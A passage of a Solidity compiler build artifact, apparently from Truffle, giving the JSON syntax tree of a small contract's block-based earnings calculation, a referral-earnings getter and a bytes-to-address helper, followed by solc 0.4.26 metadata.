                                      "hexvalue": "313030",
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "subdenomination": null,
                                      "token": "number",
                                      "type": "int_const 100",
                                      "value": "100"
                                    },
                                    "id": 309,
                                    "name": "Literal",
                                    "src": "2186:3:0"
                                  }
                                ],
                                "id": 310,
                                "name": "FunctionCall",
                                "src": "2155:35:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "operator": "-",
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "lValueRequested": false,
                                      "member_name": "number",
                                      "referencedDeclaration": null,
                                      "type": "uint256"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 349,
                                          "type": "block",
                                          "value": "block"
                                        },
                                        "id": 311,
                                        "name": "Identifier",
                                        "src": "2191:5:0"
                                      }
                                    ],
                                    "id": 312,
                                    "name": "MemberAccess",
                                    "src": "2191:12:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": true,
                                      "isPure": false,
                                      "lValueRequested": false,
                                      "type": "uint256"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 23,
                                          "type": "mapping(address => uint256)",
                                          "value": "blocklock"
                                        },
                                        "id": 313,
                                        "name": "Identifier",
                                        "src": "2204:9:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 295,
                                          "type": "address",
                                          "value": "_address"
                                        },
                                        "id": 314,
                                        "name": "Identifier",
                                        "src": "2214:8:0"
                                      }
                                    ],
                                    "id": 315,
                                    "name": "IndexAccess",
                                    "src": "2204:19:0"
                                  }
                                ],
                                "id": 316,
                                "name": "BinaryOperation",
                                "src": "2191:32:0"
                              }
                            ],
                            "id": 317,
                            "name": "FunctionCall",
                            "src": "2151:73:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "hexvalue": "35393030",
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "subdenomination": null,
                              "token": "number",
                              "type": "int_const 5900",
                              "value": "5900"
                            },
                            "id": 318,
                            "name": "Literal",
                            "src": "2225:4:0"
                          }
                        ],
                        "id": 319,
                        "name": "FunctionCall",
                        "src": "2147:83:0"
                      }
                    ],
                    "id": 320,
                    "name": "Return",
                    "src": "2140:90:0"
                  }
                ],
                "id": 321,
                "name": "Block",
                "src": "2136:101:0"
              }
            ],
            "id": 322,
            "name": "FunctionDefinition",
            "src": "2062:175:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "userReferralsWei",
              "payable": false,
              "scope": 344,
              "stateMutability": "view",
              "superFunction": null,
              "visibility": "public"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_address",
                      "scope": 334,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "address",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "address",
                          "type": "address"
                        },
                        "id": 323,
                        "name": "ElementaryTypeName",
                        "src": "2266:7:0"
                      }
                    ],
                    "id": 324,
                    "name": "VariableDeclaration",
                    "src": "2266:16:0"
                  }
                ],
                "id": 325,
                "name": "ParameterList",
                "src": "2265:18:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 334,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 326,
                        "name": "ElementaryTypeName",
                        "src": "2305:7:0"
                      }
                    ],
                    "id": 327,
                    "name": "VariableDeclaration",
                    "src": "2305:7:0"
                  }
                ],
                "id": 328,
                "name": "ParameterList",
                "src": "2304:9:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "functionReturnParameters": 328
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": true,
                          "isPure": false,
                          "lValueRequested": false,
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 19,
                              "type": "mapping(address => uint256)",
                              "value": "refearned"
                            },
                            "id": 329,
                            "name": "Identifier",
                            "src": "2325:9:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 324,
                              "type": "address",
                              "value": "_address"
                            },
                            "id": 330,
                            "name": "Identifier",
                            "src": "2335:8:0"
                          }
                        ],
                        "id": 331,
                        "name": "IndexAccess",
                        "src": "2325:19:0"
                      }
                    ],
                    "id": 332,
                    "name": "Return",
                    "src": "2318:26:0"
                  }
                ],
                "id": 333,
                "name": "Block",
                "src": "2314:37:0"
              }
            ],
            "id": 334,
            "name": "FunctionDefinition",
            "src": "2240:111:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "bytesToAddress",
              "payable": false,
              "scope": 344,
              "stateMutability": "pure",
              "superFunction": null,
              "visibility": "private"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "bys",
                      "scope": 343,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "bytes",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "bytes",
                          "type": "bytes"
                        },
                        "id": 335,
                        "name": "ElementaryTypeName",
                        "src": "2378:5:0"
                      }
                    ],
                    "id": 336,
                    "name": "VariableDeclaration",
                    "src": "2378:9:0"
                  }
                ],
                "id": 337,
                "name": "ParameterList",
                "src": "2377:11:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "addr",
                      "scope": 343,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "address",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "address",
                          "type": "address"
                        },
                        "id": 338,
                        "name": "ElementaryTypeName",
                        "src": "2411:7:0"
                      }
                    ],
                    "id": 339,
                    "name": "VariableDeclaration",
                    "src": "2411:12:0"
                  }
                ],
                "id": 340,
                "name": "ParameterList",
                "src": "2410:14:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "externalReferences": [
                        {
                          "addr": {
                            "declaration": 339,
                            "isOffset": false,
                            "isSlot": false,
                            "src": "2443:4:0",
                            "valueSize": 1
                          }
                        },
                        {
                          "bys": {
                            "declaration": 336,
                            "isOffset": false,
                            "isSlot": false,
                            "src": "2461:3:0",
                            "valueSize": 1
                          }
                        }
                      ],
                      "operations": "{\n    addr := mload(add(bys, 20))\n}"
                    },
                    "children": [],
                    "id": 341,
                    "name": "InlineAssembly",
                    "src": "2429:48:0"
                  }
                ],
                "id": 342,
                "name": "Block",
                "src": "2425:52:0"
              }
            ],
            "id": 343,
            "name": "FunctionDefinition",
            "src": "2354:123:0"
          }
        ],
        "id": 344,
        "name": "ContractDefinition",
        "src": "25:2454:0"
      }
    ],
    "id": 345,
    "name": "SourceUnit",
    "src": "0:2479:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.4.13",
  "updatedAt": "2023-08-31T07:30:21.776Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}